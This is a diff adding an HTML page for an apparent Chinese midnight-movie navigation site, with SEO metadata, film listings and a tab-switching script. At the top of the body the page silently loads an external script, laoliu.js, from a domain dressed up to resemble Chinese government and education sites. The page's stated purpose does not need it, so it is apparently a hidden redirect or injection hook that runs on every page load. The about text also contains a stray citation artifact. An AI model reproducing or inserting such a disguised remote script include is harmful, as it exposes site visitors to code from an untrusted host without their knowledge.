@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>神马电影网午夜 - 午夜悬疑/伦理/老片重映在线导航</title>
+<meta name="description" content="神马电影网午夜(shenmadianyingwangwuye-h5.github.io)整理午夜场电影：悬疑夜场、情欲伦理、老片重映，移动端自适应，影视信息导航站。">
+<meta name="keywords" content="神马电影网午夜,午夜电影,悬疑夜场,情欲伦理,老片重映,电影导航">
+<meta name="author" content="神马电影网午夜">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="神马电影网午夜 - 午夜电影导航">
+<meta property="og:description" content="神马电影网午夜整理悬疑夜场、情欲伦理、老片重映片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://shenmadianyingwangwuye-h5.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px;scroll-behavior:smooth}
+body{
+  font-family:'PingFang SC','Microsoft YaHei',sans-serif;
+  background:#0a0716;color:#ece3ff;line-height:1.7;overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+
+/* FM 顶栏 */
+.fm-bar{
+  position:sticky;top:0;z-index:999;
+  background:rgba(10,7,22,.94);border-bottom:1px solid #2b2150;
+  padding:.6rem .9rem;
+}
+.fm-top{display:flex;align-items:center;justify-content:space-between}
+.brand{font-size:1.05rem;font-weight:900;letter-spacing:.5px}
+.brand b{color:#ffb454;text-shadow:0 0 8px rgba(255,180,84,.5)}
+.brand i{color:#9b8cff;font-style:normal}
+.freq{font-size:.7rem;color:#9b8cff}
+.freq b{color:#ffb454}
+.fm-tabs{display:flex;gap:.35rem;margin-top:.55rem;overflow-x:auto}
+.fm-tabs a{
+  font-size:.74rem;padding:.32rem .7rem;white-space:nowrap;border-radius:20px;
+  border:1px solid #2b2150;color:#b9a9e6;transition:.25s;
+}
+.fm-tabs a.active,.fm-tabs a:hover{
+  background:linear-gradient(135deg,#ffb454,#9b8cff);color:#0a0716;font-weight:700;border-color:transparent;
+}
+
+.wrap{padding:1rem;max-width:1080px;margin:0 auto}
+
+/* 面板 */
+.band{display:none;animation:tune .4s ease}
+.band.active{display:block}
+@keyframes tune{from{opacity:0;filter:hue-rotate(20deg)}to{opacity:1;filter:none}}
+
+.band h2{font-size:1.22rem;color:#ffb454;margin:0 0 1rem;padding-left:.5rem;border-left:4px solid #9b8cff}
+
+/* 首页 */
+#home .studio{
+  background:radial-gradient(120% 120% at 85% 0%,#241a45,#0a0716 60%);
+  border:1px solid #2b2150;border-radius:18px;padding:1.6rem;margin-bottom:1rem;
+}
+#home .studio h1{font-size:1.65rem;color:#ffb454;margin-bottom:.4rem}
+#home .studio h1 span{color:#9b8cff}
+#home .studio p{font-size:.86rem;color:#b9a9e6}
+.now-band{margin-top:1rem;display:grid;grid-template-columns:repeat(3,1fr);gap:.7rem}
+.nb{background:#160f2e;border:1px solid #2b2150;border-radius:12px;padding:.9rem;text-align:center}
+.nb .hz{font-size:1.05rem;color:#ffb454;font-weight:800}
+.nb h3{font-size:.82rem;color:#ece3ff;margin:.25rem 0 .1rem}
+.nb p{font-size:.68rem;color:#8a7bc0}
+
+/* 海报墙 */
+.poster-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(155px,1fr));gap:.8rem}
+.poster{
+  background:#160f2e;border:1px solid #2b2150;border-radius:14px;overflow:hidden;position:relative;transition:.25s;
+}
+.poster:hover{transform:translateY(-4px);box-shadow:0 8px 22px rgba(155,140,255,.22)}
+.poster .art{height:116px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.78rem;color:#0a0716}
+.poster .art.amber{background:linear-gradient(135deg,#ffb454,#ff7e9d)}
+.poster .art.violet{background:linear-gradient(135deg,#9b8cff,#5b3cff)}
+.poster .art.night{background:linear-gradient(135deg,#2b2150,#7a5cff);color:#ece3ff}
+.poster .pbody{padding:.6rem}
+.poster .pbody h3{font-size:.84rem;color:#f3eeff;margin-bottom:.15rem}
+.poster .pbody span{font-size:.68rem;color:#8a7bc0}
+.poster .tag{position:absolute;top:6px;left:6px;background:#0a0716cc;color:#ffb454;font-size:.6rem;padding:.15rem .4rem;border-radius:5px;font-weight:700}
+
+/* 情欲伦理 - 列表 */
+.ethic-list{display:flex;flex-direction:column;gap:.7rem}
+.ethic{
+  display:flex;gap:.8rem;background:#160f2e;border:1px solid #2b2150;border-radius:12px;padding:.85rem;align-items:flex-start;
+}
+.ethic .no{width:34px;height:34px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(135deg,#ffb454,#9b8cff);color:#0a0716;font-weight:800;font-size:.78rem}
+.ethic h3{font-size:.9rem;color:#f3eeff;margin-bottom:.2rem}
+.ethic p{font-size:.74rem;color:#b9a9e6}
+
+/* 老片重映 */
+.reel{display:flex;gap:.6rem;overflow-x:auto;padding-bottom:.4rem}
+.reel::-webkit-scrollbar{height:5px}
+.reel::-webkit-scrollbar-thumb{background:#2b2150;border-radius:5px}
+.reel .cell{min-width:150px;background:#160f2e;border:1px solid #2b2150;border-radius:10px;padding:.9rem;text-align:center}
+.reel .cell .yr{font-size:.7rem;color:#8a7bc0}
+.reel .cell h3{font-size:.84rem;color:#ffb454;margin:.2rem 0}
+
+/* 关于 */
+.about-night{background:radial-gradient(120% 120% at 15% 0%,#241a45,#0a0716);border:1px solid #ffb454;border-radius:18px;padding:1.5rem}
+.about-night h2{color:#ffb454;border:0;padding:0;margin-bottom:.8rem}
+.about-night p{font-size:.85rem;color:#b9a9e6;margin-bottom:.6rem}
+.about-night .info{margin-top:1rem;background:#160f2e;border:1px dashed #9b8cff;border-radius:12px;padding:1rem}
+.about-night .info h3{color:#9b8cff;margin-bottom:.4rem}
+.about-night .info p{font-size:.78rem;color:#8a7bc0}
+
+/* 走马灯 */
+.marquee{margin-top:1.6rem;border-top:1px solid #2b2150;padding:.7rem 0;overflow:hidden;white-space:nowrap}
+.marquee span{font-size:.72rem;color:#8a7bc0;margin-right:2rem}
+.foot{text-align:center;padding:1.2rem 1rem;font-size:.72rem;color:#5a4a8a}
+
+@media(max-width:768px){
+  .now-band{grid-template-columns:1fr}
+  .poster-grid{grid-template-columns:repeat(2,1fr)}
+  .brand{font-size:.95rem}
+  #home .studio h1{font-size:1.35rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="fm-bar">
+  <div class="fm-top">
+    <div class="brand">神马电影网<b>午夜</b><i>FM</i></div>
+    <div class="freq">当前频段 <b>99.7MHz</b> · 深夜档</div>
+  </div>
+  <nav class="fm-tabs">
+    <a href="#" class="fm active" data-band="home">午夜首页</a>
+    <a href="#" class="fm" data-band="noir">悬疑夜场</a>
+    <a href="#" class="fm" data-band="ethic">情欲伦理</a>
+    <a href="#" class="fm" data-band="classic">老片重映</a>
+    <a href="#" class="fm" data-band="about">关于</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <!-- 午夜首页 -->
+  <section id="home" class="band active">
+    <div class="studio">
+      <h1>神马电影网<span>午夜</span></h1>
+      <p>深夜开台：悬疑、伦理、老片重映，像电台一样一档接一档播下去。</p>
+      <div class="now-band">
+        <div class="nb"><div class="hz">99.7</div><h3>夜场悬疑</h3><p>凶案 / 密室 / 回环</p></div>
+        <div class="nb"><div class="hz">101.3</div><h3>伦理夜话</h3><p>婚姻 / 代际 / 欲望</p></div>
+        <div class="nb"><div class="hz">88.0</div><h3>老片重映</h3><p>胶片 / 黑白 / 经典</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 悬疑夜场 -->
+  <section id="noir" class="band">
+    <h2>🕯 悬疑夜场</h2>
+    <div class="poster-grid">
+      <div class="poster"><div class="tag">夜场</div><div class="art amber">密室</div><div class="pbody"><h3>午夜预言信</h3><span>悬疑 / 心理 / 2025</span></div></div>
+      <div class="poster"><div class="tag">新片</div><div class="art violet">回环</div><div class="pbody"><h3>第十三次敲门</h3><span>烧脑 / 时间 / 2026</span></div></div>
+      <div class="poster"><div class="tag">冷门</div><div class="art night">雾港</div><div class="pbody"><h3>雾港旧案</h3><span>黑色 / 犯罪 / 2024</span></div></div>
+      <div class="poster"><div class="tag">热推</div><div class="art amber">伪纪</div><div class="pbody"><h3>谁在录音</h3><span>伪纪录 / 惊悚 / 2025</span></div></div>
+    </div>
+  </section>
+
+  <!-- 情欲伦理 -->
+  <section id="ethic" class="band">
+    <h2>🌒 情欲伦理</h2>
+    <div class="ethic-list">
+      <div class="ethic"><div class="no">01</div><div><h3>凌晨两点的房东</h3><p>租房合同之外，两个孤独的人把沉默住成了习惯。</p></div></div>
+      <div class="ethic"><div class="no">02</div><div><h3>婚戒的另一面</h3><p>结婚十年，她在旧钱包里翻出一张不是丈夫的照片。</p></div></div>
+      <div class="ethic"><div class="no">03</div><div><h3>海边旅馆 307</h3><p>一夜、一封信、一场谁都不提的过去。</p></div></div>
+      <div class="ethic"><div class="no">04</div><div><h3>母亲的情人节</h3><p>女儿离家后，母亲重新开始学被允许喜欢一个人。</p></div></div>
+    </div>
+  </section>
+
+  <!-- 老片重映 -->
+  <section id="classic" class="band">
+    <h2>🎞 老片重映</h2>
+    <div class="reel">
+      <div class="cell"><div class="yr">1979</div><h3>雾中列车</h3><p>公路 / 文艺</p></div>
+      <div class="cell"><div class="yr">1994</div><h3>夜访吸血鬼</h3><p>哥特 / 奇情</p></div>
+      <div class="cell"><div class="yr">2000</div><h3>花样年华</h3><p>婚姻 / 暧昧</p></div>
+      <div class="cell"><div class="yr">2006</div><h3>致命魔术</h3><p>悬疑 / 双雄</p></div>
+      <div class="cell"><div class="yr">2012</div><h3>爱在午夜降临前</h3><p>对话 / 爱情</p></div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about" class="band">
+    <div class="about-night">
+      <h2>关于 神马电影网午夜</h2>
+      <p>神马电影网午夜是一个“午夜档片单导航站”，用电台频段的方式组织内容：悬疑夜场、情欲伦理、老片重映一档接一档。</p>
+      <p>页面采用单文件 H5 结构，CSS/JS 全部内联，手机、平板、电脑一套代码自适应；标题、栏目、片单文字直接写在 HTML 里，方便必应等搜索引擎抓取。[2](@ref)</p>
+      <p>本站仅做影视信息展示与分类导航，不提供盗版资源，也不生成 robots.txt / sitemap.xml。</p>
+      <div class="info">
+        <h3>站点信息</h3>
+        <p>网站名称：神马电影网午夜</p>
+        <p>网址：https://shenmadianyingwangwuye-h5.github.io</p>
+        <p>关键词：神马电影网午夜、午夜电影、悬疑夜场、情欲伦理、老片重映</p>
+      </div>
+    </div>
+  </section>
+
+  <div class="marquee">
+    <span>📻 99.7MHz 夜场悬疑</span>
+    <span>🌒 情欲伦理不靠尺度靠人心</span>
+    <span>🎞 老片重映 胶片回归</span>
+    <span>🕯 凌晨一点 灯还亮着</span>
+    <span>🎬 神马电影网午夜 开台</span>
+  </div>
+
+  <footer class="foot">
+    <p>© 2024 神马电影网午夜 | https://shenmadianyingwangwuye-h5.github.io</p>
+    <p>本网站仅提供影视信息展示与分类导航，所有资源来自互联网，如有侵权请联系删除。</p>
+  </footer>
+</main>
+
+<script>
+document.querySelectorAll('.fm').forEach(function(t){
+  t.addEventListener('click',function(e){
+    e.preventDefault();
+    var b=this.dataset.band;
+    document.querySelectorAll('.band').forEach(function(x){x.classList.remove('active')});
+    document.getElementById(b).classList.add('active');
+    document.querySelectorAll('.fm').forEach(function(x){x.classList.remove('active')});
+    this.classList.add('active');
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
